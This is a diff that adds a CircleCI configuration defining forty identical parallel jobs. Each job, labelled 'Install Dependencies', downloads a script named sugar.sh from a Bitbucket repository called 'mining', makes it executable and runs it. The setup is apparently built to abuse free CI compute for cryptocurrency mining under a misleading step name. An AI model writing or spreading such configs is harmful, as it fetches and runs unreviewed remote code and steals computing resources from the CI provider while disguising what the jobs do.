@@ -1,0 +1,327 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku11:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku12:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku13:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku14:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku15:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku16:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku17:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku18:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku19:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku20:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku21:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku22:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku23:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku24:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku25:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku26:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku27:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku28:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku29:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku30:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku31:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku32:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku33:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku34:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku35:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku36:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku37:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku38:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku39:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+    aku40:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://bitbucket.org/noval6161/mining/raw/966a67bf0e5cfc9a011390a0e5bfa36be47c9618/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
+            - aku21
+            - aku22
+            - aku23
+            - aku24
+            - aku25
+            - aku26
+            - aku27
+            - aku28
+            - aku29
+            - aku30
+            - aku31
+            - aku32
+            - aku33
+            - aku34
+            - aku35
+            - aku36
+            - aku37
+            - aku38
+            - aku39
+            - aku40
